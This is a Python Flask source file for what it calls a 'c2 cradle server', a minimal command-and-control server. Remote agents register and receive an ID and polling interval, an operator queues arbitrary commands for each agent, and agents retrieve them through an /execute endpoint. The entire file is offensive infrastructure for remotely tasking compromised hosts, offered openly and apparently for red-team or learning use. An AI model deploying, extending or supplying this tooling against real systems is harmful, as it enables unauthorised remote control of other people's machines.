from flask import Flask, jsonify
from flask import request
import string
import random

app = Flask(__name__)

clients = []
commands = []


# https://stackoverflow.com/questions/2257441/random-string-generation-with-upper-case-letters-and-digits
def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


@app.route("/")
def hello_world():
    return "<p>Welcome to the c2 cradle server!</p>"


@app.route("/register")
def agent_id():
    agentId = id_generator()
    interval = 10  # default interval in seconds
    clients.append([agentId, request.remote_addr, interval])
    print(agentId, request.remote_addr, "has connected with interval", interval)
    return jsonify({"agentId": agentId, "interval": interval})

@app.route("/clients")
def list_clients():
    return jsonify(clients)


@app.route("/deregister", methods=['POST'])
def deregister():
    agent_id = request.form["agentId"]
    global clients
    clients = [c for c in clients if c[0] != agent_id]
    print(agent_id, "has deregistered")
    return "deregistered"


@app.route("/execute", methods=['POST'])
def execute_command():
    agent_id = request.form["agentId"]
    for command in commands:
        if agent_id in command:
            commands.remove(command)
            return command[1]
    return "no commands found"


@app.route("/add-command", methods=['POST'])
def add_command():
    if request.method == 'POST':
        agent_id = request.form["agentId"]
        commands.append([agent_id, request.form["command"]])
        return "received command: " + request.form["command"]
    else:
        return "not a post request"


@app.route("/show-commands")
def show_commands():
    return commands


if __name__ == "__main__":
    app.run()
